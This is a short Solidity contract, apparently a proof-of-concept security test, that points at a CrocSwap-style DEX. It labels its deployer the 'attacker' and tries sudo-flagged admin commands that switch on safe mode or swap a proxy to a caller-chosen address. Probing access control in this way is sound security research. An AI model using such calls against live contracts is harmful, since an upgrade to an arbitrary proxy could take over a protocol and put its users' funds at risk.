// SPDX-License-Identifier: GPL-3
pragma solidity 0.8.19;

interface ICrocSwapDex {
    function protocolCmd(uint16 callpath, bytes calldata cmd, bool sudo) external payable;
    function owner() external view returns (address);
    function authority_() external view returns (address);
    function sudoMode_() external view returns (bool);
}


interface IBootPath {
    function protocolCmd(bytes calldata cmd) external;
}

library ProtocolCmdCodes {

    uint8 constant AUTHORITY_TRANSFER_CODE = 20;
    uint8 constant UPGRADE_DEX_CODE = 21;
    uint8 constant HOT_OPEN_CODE = 22;
    uint8 constant SAFE_MODE_CODE = 23;
    uint8 constant COLLECT_TREASURY_CODE = 40;
    uint8 constant SET_TREASURY_CODE = 41;
}

library CrocSlots {

    uint16 constant BOOT_PROXY_IDX = 0;
    uint16 constant SWAP_PROXY_IDX = 1;
}


contract SudoModeTester {
    ICrocSwapDex public targetDex;
    address public currentAttacker;

    constructor(address _targetDexAddress) {
        targetDex = ICrocSwapDex(_targetDexAddress);
        currentAttacker = msg.sender;
    }

    function testSafeModeActivationAndCall(bool activateSafeMode) external {

        bytes memory cmdPayload = abi.encode(ProtocolCmdCodes.SAFE_MODE_CODE, activateSafeMode);

        targetDex.protocolCmd(CrocSlots.BOOT_PROXY_IDX, cmdPayload, true);
    }

    
    function testUpgradeProxy(address newProxyAddress, uint16 proxyIndex) external {
        
        bytes memory cmdPayload = abi.encode(
            ProtocolCmdCodes.UPGRADE_DEX_CODE,
            newProxyAddress,
            proxyIndex
        );

    
        targetDex.protocolCmd(CrocSlots.BOOT_PROXY_IDX, cmdPayload, true);
    }


    function checkDexState() external view returns (bool isSudoMode, address currentAuthority) {
        isSudoMode = targetDex.sudoMode_();
        currentAuthority = targetDex.authority_();
    }
}
